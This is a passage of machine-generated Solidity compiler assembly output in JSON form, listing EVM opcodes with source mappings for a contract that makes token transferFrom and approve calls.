											"value": "0"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "tag",
											"source": 4,
											"value": "75"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "77"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "tag",
											"source": 4,
											"value": "77"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 2024,
											"end": 2027,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 2024,
											"end": 2027,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 2024,
											"end": 2027,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 2034,
											"end": 2040,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 2024,
											"end": 2027,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2042,
											"end": 2048,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "DF791E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 2024,
											"end": 2027,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 2024,
											"end": 2027,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 2024,
											"end": 2027,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2024,
											"end": 2027,
											"name": "SWAP6",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 2019,
											"end": 2033,
											"name": "PUSH",
											"source": 4,
											"value": "DF791E50"
										},
										{
											"begin": 2019,
											"end": 2033,
											"name": "SWAP5",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "78"
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 2034,
											"end": 2040,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 2034,
											"end": 2040,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 2034,
											"end": 2040,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2034,
											"end": 2040,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 2042,
											"end": 2048,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2042,
											"end": 2048,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 2042,
											"end": 2048,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2042,
											"end": 2048,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2050,
											"end": 2052,
											"name": "PUSH",
											"source": 4,
											"value": "2D"
										},
										{
											"begin": 2050,
											"end": 2052,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 2019,
											"end": 2053,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "tag",
											"source": 4,
											"value": "78"
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "EXTCODESIZE",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "80"
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "tag",
											"source": 4,
											"value": "80"
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "82"
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "tag",
											"source": 4,
											"value": "82"
										},
										{
											"begin": 2019,
											"end": 2053,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 2203,
											"end": 2209,
											"name": "PUSH",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 2203,
											"end": 2209,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 2236,
											"end": 2239,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 2236,
											"end": 2239,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "23B872DD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 2203,
											"end": 2209,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 2203,
											"end": 2209,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 2203,
											"end": 2209,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2203,
											"end": 2209,
											"name": "SWAP5",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 2196,
											"end": 2223,
											"name": "PUSH",
											"source": 4,
											"value": "23B872DD"
										},
										{
											"begin": 2196,
											"end": 2223,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "83"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 2224,
											"end": 2234,
											"name": "CALLER",
											"source": 4
										},
										{
											"begin": 2224,
											"end": 2234,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 2236,
											"end": 2239,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2236,
											"end": 2239,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2241,
											"end": 2243,
											"name": "PUSH",
											"source": 4,
											"value": "5A"
										},
										{
											"begin": 2241,
											"end": 2243,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 2196,
											"end": 2244,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "tag",
											"source": 4,
											"value": "83"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "86"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "tag",
											"source": 4,
											"value": "86"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "87"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "21"
										},
										{
											"begin": 2196,
											"end": 2244,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "tag",
											"source": 4,
											"value": "87"
										},
										{
											"begin": 2196,
											"end": 2244,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 2261,
											"end": 2267,
											"name": "PUSH",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 2261,
											"end": 2267,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "23B872DD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 2261,
											"end": 2267,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2261,
											"end": 2267,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 2261,
											"end": 2267,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2261,
											"end": 2267,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2281,
											"name": "PUSH",
											"source": 4,
											"value": "23B872DD"
										},
										{
											"begin": 2254,
											"end": 2281,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "88"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2282,
											"end": 2292,
											"name": "CALLER",
											"source": 4
										},
										{
											"begin": 2282,
											"end": 2292,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2302,
											"end": 2306,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 2302,
											"end": 2306,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2309,
											"end": 2311,
											"name": "PUSH",
											"source": 4,
											"value": "5A"
										},
										{
											"begin": 2309,
											"end": 2311,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 2254,
											"end": 2312,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "tag",
											"source": 4,
											"value": "88"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "90"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "tag",
											"source": 4,
											"value": "90"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "91"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "21"
										},
										{
											"begin": 2254,
											"end": 2312,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "tag",
											"source": 4,
											"value": "91"
										},
										{
											"begin": 2254,
											"end": 2312,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 2329,
											"end": 2335,
											"name": "PUSH",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 2329,
											"end": 2335,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 2345,
											"end": 2348,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 2345,
											"end": 2348,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "95EA7B3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 2345,
											"end": 2348,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 2345,
											"end": 2348,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 2345,
											"end": 2348,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1150,
											"end": 1201,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 1217,
											"end": 1235,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1217,
											"end": 1235,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 1217,
											"end": 1235,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1210,
											"end": 1244,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 2329,
											"end": 2335,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 2329,
											"end": 2335,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2329,
											"end": 2335,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2344,
											"name": "PUSH",
											"source": 4,
											"value": "95EA7B3"
										},
										{
											"begin": 2322,
											"end": 2344,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1123,
											"end": 1141,
											"name": "PUSH",
											"source": 5,
											"value": "44"
										},
										{
											"begin": 1123,
